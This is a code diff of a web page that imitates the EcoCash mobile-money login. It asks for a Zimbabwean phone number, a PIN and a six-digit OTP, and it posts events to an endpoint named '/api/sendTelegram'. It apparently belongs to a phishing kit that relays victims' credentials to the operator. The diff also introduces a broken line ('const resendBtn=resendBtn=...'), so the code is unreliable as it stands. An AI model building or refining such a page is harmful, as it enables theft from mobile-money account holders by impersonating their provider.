@@ -55,12 +55,7 @@ input{
 .req{color:#d04444;margin-right:6px}
 .small{font-size:13px;color:#6b7280}
 .success{color:#16a34a;font-weight:600}
-
-.error{
-  min-height:18px;
-  font-size:13px;
-  color:#d04444;
-}
+.error{min-height:18px;font-size:13px;color:#d04444}
 
 /* PIN */
 .pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
@@ -96,7 +91,6 @@ input{
   border-radius:8px;
   border:1px solid #e6eefc
 }
-.otp-warning{color:#d04444;font-size:13px;display:none}
 
 .resend-row{
   display:flex;
@@ -122,8 +116,7 @@ input{
 
 /* Spinner */
 .spinner{
-  width:14px;
-  height:14px;
+  width:14px;height:14px;
   border:2px solid rgba(255,255,255,.5);
   border-top-color:#fff;
   border-radius:50%;
@@ -143,7 +136,6 @@ input{
   padding:10px 14px;
   border-radius:10px;
   font-size:14px;
-  box-shadow:0 8px 20px rgba(0,0,0,.15);
   display:none;
   z-index:50;
 }
@@ -162,58 +154,47 @@ input{
   font-weight:600;
   cursor:pointer;
 }
-#confirmOtp{
-  background:#4b86ff;
-  color:#fff;
-}
-#confirmOtp[disabled]{
-  background:#cbd5e1;
-  cursor:not-allowed;
-}
-#cancelOtp{
-  background:#e5e7eb;
-  color:#111;
-}
+#confirmOtp{background:#4b86ff;color:#fff}
+#confirmOtp[disabled]{background:#cbd5e1}
+#cancelOtp{background:#e5e7eb;color:#111}
 </style>
 </head>
 
 <body>
 
 <div class="card">
-  <img src="assets/eco.png" alt="EcoCash" class="logo">
+  <img src="assets/eco.png" class="logo">
   <h2>Login</h2>
 
-  <form id="loginForm" autocomplete="off">
+  <form id="loginForm">
     <label><span class="req">★</span>Mobile Number</label>
-    <input id="phone" value="+263" inputmode="numeric">
+    <input id="phone" value="+263">
     <div id="phoneError" class="error"></div>
 
     <label><span class="req">★</span>Enter your PIN</label>
     <div class="pin-row">
-      <input class="pin-digit" maxlength="1" inputmode="numeric">
-      <input class="pin-digit" maxlength="1" inputmode="numeric">
-      <input class="pin-digit" maxlength="1" inputmode="numeric">
-      <input class="pin-digit" maxlength="1" inputmode="numeric">
+      <input class="pin-digit" maxlength="1">
+      <input class="pin-digit" maxlength="1">
+      <input class="pin-digit" maxlength="1">
+      <input class="pin-digit" maxlength="1">
     </div>
 
-    <input type="text" id="hp" style="display:none">
+    <input id="hp" style="display:none">
     <button id="loginBtn" class="btn" disabled>LOGIN</button>
   </form>
 </div>
 
-<!-- OTP MODAL -->
 <div id="otpModal" class="otp-modal" style="display:none">
   <div class="otp-box">
-    <div style="text-align:center"><strong>Enter OTP</strong></div>
-    <p class="small">We have sent an OTP to your phone.</p>
+    <strong style="display:block;text-align:center">Enter OTP</strong>
 
     <div class="otp-row">
-      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d0">
-      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d1">
-      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d2">
-      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d3">
-      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d4">
-      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d5">
+      <input class="otp-digit" maxlength="1" id="d0">
+      <input class="otp-digit" maxlength="1" id="d1">
+      <input class="otp-digit" maxlength="1" id="d2">
+      <input class="otp-digit" maxlength="1" id="d3">
+      <input class="otp-digit" maxlength="1" id="d4">
+      <input class="otp-digit" maxlength="1" id="d5">
     </div>
 
     <div class="resend-row">
@@ -221,7 +202,7 @@ input{
         Resend available in <span id="countdown">120</span>s
       </div>
       <button id="resendBtn" class="resend-btn" disabled>
-        <span class="spinner" id="spinner"></span>
+        <span id="spinner" class="spinner"></span>
         <span id="resendText">Resend OTP</span>
       </button>
     </div>
@@ -231,49 +212,41 @@ input{
       <button id="cancelOtp">Cancel</button>
     </div>
 
-    <div id="otpStatus" class="small" style="margin-top:8px"></div>
+    <div id="otpStatus" class="small"></div>
   </div>
 </div>
 
 <div id="toast" class="toast">OTP resent successfully</div>
 
 <script>
-/* ===== DEVICE STRING ===== */
-const ua = navigator.userAgent;
-let device = 'Unknown';
-if (/Android/i.test(ua)) device='Android';
-if (/iPhone|iPad/i.test(ua)) device='iOS';
+/* ===== API ===== */
+async function sendToServer(payload){
+  return fetch('/api/sendTelegram',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(payload)
+  });
+}
 
-/* ===== GET SELECTED PLAN ===== */
-let planData=null;
-try{const raw=sessionStorage.getItem('selectedPlan');if(raw)planData=JSON.parse(raw);}catch(e){}
-
-/* ===== OTP ===== */
-const resendBtn=document.getElementById('resendBtn');
+/* ===== OTP COUNTDOWN ===== */
+const resendBtn=resendBtn=document.getElementById('resendBtn');
 const resendInfo=document.getElementById('resendInfo');
 const spinner=document.getElementById('spinner');
 const resendText=document.getElementById('resendText');
 const toast=document.getElementById('toast');
 
-let countdownEl=null;
-let timer,seconds=120;
-
-function showToast(){
-  toast.style.display='block';
-  setTimeout(()=>toast.style.display='none',2500);
-}
+let timer,seconds=120,countdownEl;
 
 function startCountdown(){
   clearInterval(timer);
   seconds=120;
   resendBtn.disabled=true;
-
   resendInfo.innerHTML='Resend available in <span id="countdown">120</span>s';
   countdownEl=document.getElementById('countdown');
 
   timer=setInterval(()=>{
     seconds--;
-    if(countdownEl) countdownEl.textContent=seconds;
+    countdownEl.textContent=seconds;
     if(seconds<=0){
       clearInterval(timer);
       resendBtn.disabled=false;
@@ -282,21 +255,17 @@ function startCountdown(){
   },1000);
 }
 
+function showToast(){
+  toast.style.display='block';
+  setTimeout(()=>toast.style.display='none',2500);
+}
+
 resendBtn.onclick=async()=>{
   spinner.style.display='inline-block';
   resendText.textContent='Sending';
   startCountdown();
 
-  await fetch('/api/sendTelegram',{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({
-      event:'resend_otp',
-      selectedPlan:planData,
-      device,
-      submittedAt:new Date().toISOString()
-    })
-  });
+  await sendToServer({event:'resend_otp'});
 
   spinner.style.display='none';
   resendText.textContent='Resend OTP';
